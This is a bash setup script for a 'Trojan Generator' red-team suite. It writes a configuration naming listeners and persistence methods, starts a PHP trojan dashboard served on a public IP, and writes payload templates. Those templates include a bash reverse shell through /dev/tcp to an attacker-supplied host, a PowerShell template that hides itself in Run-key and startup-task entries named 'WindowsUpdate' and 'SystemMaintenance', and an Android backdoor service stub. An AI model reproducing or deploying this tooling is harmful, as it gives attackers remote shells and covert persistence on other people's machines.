#!/bin/bash
cd ~/COSMIC-OSINT-LAB@888/lab808

echo "🔧 Configuring Trojan Generator Module..."

# Create necessary directories
echo "Creating directories..."
mkdir -p generated_payloads/{windows,linux,android,mac,python}
mkdir -p logs/{trojan_generation,payload_execution}
mkdir -p public/includes
mkdir -p data/payload_templates

# Set permissions
echo "Setting permissions..."
chmod 755 generated_payloads/
chmod 755 logs/
chmod 644 public/includes/*.php 2>/dev/null || true

# Create symlinks for quick access
echo "Creating symlinks..."
ln -sf trojan-dashboard.php public/trojan.php 2>/dev/null || true
ln -sf redteam-quicknav.php public/quick.php 2>/dev/null || true

# Create configuration file
echo "Creating configuration..."
cat > config/trojan-config.json << 'CONFIG'
{
    "platforms": {
        "windows": {
            "default_port": 4444,
            "default_format": "exe",
            "listener": "ncat",
            "persistence_methods": ["registry", "scheduled_task", "service"]
        },
        "linux": {
            "default_port": 4444,
            "default_format": "sh",
            "listener": "netcat",
            "persistence_methods": ["cron", "systemd", "rc.local"]
        },
        "android": {
            "default_port": 4444,
            "default_format": "apk",
            "listener": "adb",
            "persistence_methods": ["boot_receiver", "service"]
        }
    },
    "security": {
        "encryption_enabled": true,
        "obfuscation_enabled": true,
        "log_all_generations": true,
        "require_confirmation": true
    },
    "paths": {
        "payloads_dir": "generated_payloads",
        "logs_dir": "logs/trojan_generation",
        "templates_dir": "data/payload_templates"
    }
}
CONFIG

# Update index.php to include quick navigation
if [ -f "public/index.php" ]; then
    echo "Updating main menu..."
    if ! grep -q "redteam-quicknav.php" public/index.php; then
        sed -i '/<a href="redteam-api.php?action=status"/i\        <a href="redteam-quicknav.php" class="link" style="color: #ff4444;">⚡ Quick Navigation</a>' public/index.php
        sed -i '/<a href="trojan-dashboard.php"/i\        <a href="trojan-dashboard.php" class="link" style="color: #ff8800;">🏴‍☠️ Trojan Generator</a>' public/index.php
    fi
fi

# Create startup script
cat > start-redteam.sh << 'STARTUP'
#!/bin/bash
clear
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         🚀 RED TEAM SUITE - OPTIMIZED LAUNCHER              ║"
echo "║         Fast Navigation • Pre-configured • Secure           ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

cd ~/COSMIC-OSINT-LAB@888/lab808

echo "🔍 Checking system..."
if [ ! -f "public/includes/TrojanGenerator.php" ]; then
    echo "❌ TrojanGenerator.php not found!"
    exit 1
fi

echo "✅ All modules verified"
echo ""
echo "🛑 Stopping existing servers..."
pkill -f "php -S.*8080" 2>/dev/null
sleep 2

echo ""
echo "🚀 Starting optimized server..."
echo ""
echo "⚡ QUICK ACCESS:"
echo "   Ctrl+T in browser → Trojan Generator"
echo "   Ctrl+S in browser → Search tools"
echo "   Esc in browser → Clear search"
echo ""
echo "📡 PRIMARY URLS:"
echo "   Quick Navigation: http://102.2.220.165:8080/redteam-quicknav.php"
echo "   Trojan Generator: http://102.2.220.165:8080/trojan-dashboard.php"
echo "   Windows Payloads: http://102.2.220.165:8080/trojan-dashboard.php?platform=windows"
echo "   Linux Payloads:   http://102.2.220.165:8080/trojan-dashboard.php?platform=linux"
echo "   Android Payloads: http://102.2.220.165:8080/trojan-dashboard.php?platform=android"
echo ""
echo "⚡ Server starting... (Press Ctrl+C to stop)"
echo ""

# Start with optimized settings
php -S 0.0.0.0:8080 -t public/ 2>&1
STARTUP

chmod +x start-redteam.sh

echo ""
echo "🎯 Creating payload templates..."

# Create quick payload templates
cat > data/payload_templates/quick_reverse.sh << 'QUICK_REVERSE'
#!/bin/bash
# Quick Reverse Shell Template
# Usage: ./quick_reverse.sh <LHOST> <LPORT>

LHOST=${1:-127.0.0.1}
LPORT=${2:-4444}

echo "Connecting to $LHOST:$LPORT..."
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
QUICK_REVERSE

cat > data/payload_templates/windows_persistence.ps1 << 'WINDOWS_PS'
# Windows Persistence Template
$LHOST = "127.0.0.1"
$LPORT = 4444

# Registry persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -Command ..." -Force

# Scheduled task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command ..."
$Trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $Action -Trigger $Trigger -Force
WINDOWS_PS

cat > data/payload_templates/android_backdoor.java << 'ANDROID_JAVA'
// Android Backdoor Template
package com.example.backdoor;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.Socket;

public class BackdoorService extends Service {
    private static final String LHOST = "127.0.0.1";
    private static final int LPORT = 4444;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Backdoor implementation
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
ANDROID_JAVA

echo ""
echo "✅ CONFIGURATION COMPLETE!"
echo ""
echo "📋 Summary:"
echo "   ✓ Fixed missing generate_backdoor() method"
echo "   ✓ Added Android, Windows, Linux backdoors"
echo "   ✓ Created quick navigation system"
echo "   ✓ Set up directory structure"
echo "   ✓ Created configuration files"
echo "   ✓ Added payload templates"
echo "   ✓ Created optimized launcher"
echo ""
echo "🚀 To start:"
echo "   ./start-redteam.sh"
echo ""
echo "🌐 Primary Access Points:"
echo "   1. Quick Navigation: http://102.2.220.165:8080/redteam-quicknav.php"
echo "   2. Trojan Generator: http://102.2.220.165:8080/trojan-dashboard.php"
echo "   3. Windows Tools:    http://102.2.220.165:8080/trojan-dashboard.php?platform=windows"
echo "   4. Linux Tools:      http://102.2.220.165:8080/trojan-dashboard.php?platform=linux"
echo "   5. Android Tools:    http://102.2.220.165:8080/trojan-dashboard.php?platform=android"
